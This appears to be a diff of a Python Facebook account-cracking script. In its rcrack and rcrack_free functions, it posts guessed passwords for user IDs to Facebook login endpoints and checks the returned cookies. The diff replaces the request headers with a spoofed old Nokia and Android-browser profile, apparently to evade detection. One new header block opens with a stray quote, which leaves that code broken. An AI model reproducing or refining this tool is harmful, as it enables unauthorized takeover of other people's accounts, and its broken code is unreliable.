@@ -493,22 +493,21 @@ def rcrack_free(idf,pwv):
 			"email":idf,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority':'free.facebook.com',
-			'method': 'GET',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-			'user-agent': pro}
+			header_freefb = {
+			"Host":cebok,
+            "upgrade-insecure-requests":"1",
+            "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "dnt":"1",
+            "x-requested-with":"mark.via.gp",
+            "sec-fetch-site":"same-origin",
+            "sec-fetch-mode":"cors",
+            "sec-fetch-user":"empty",
+            "sec-fetch-dest":"document",
+            "referer":"https://m.facebook.com/",
+            "accept-encoding":"gzip, deflate br",
+            "accept-language":"en-GB,en-US;q=0.9,en;q=0.8",
+		    "user-agent": pro}
 			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
@@ -563,22 +562,21 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			header_freefb = {'authority': 'free.facebook.com',
-			'method': 'HOST',
-			'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'id-ID',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-			'user-agent': pro,}
+			header_freefb = {'
+			"Host":cebok,
+            "upgrade-insecure-requests":"1",
+            "user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+            "dnt":"1",
+            "x-requested-with":"mark.via.gp",
+            "sec-fetch-site":"same-origin",
+            "sec-fetch-mode":"cors",
+            "sec-fetch-user":"empty",
+            "sec-fetch-dest":"document",
+            "referer":"https://m.facebook.com/",
+            "accept-encoding":"gzip, deflate br",
+            "accept-language":"en-GB,en-US;q=0.9,en;q=0.8",
+			"user-agent": pro}
 			lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
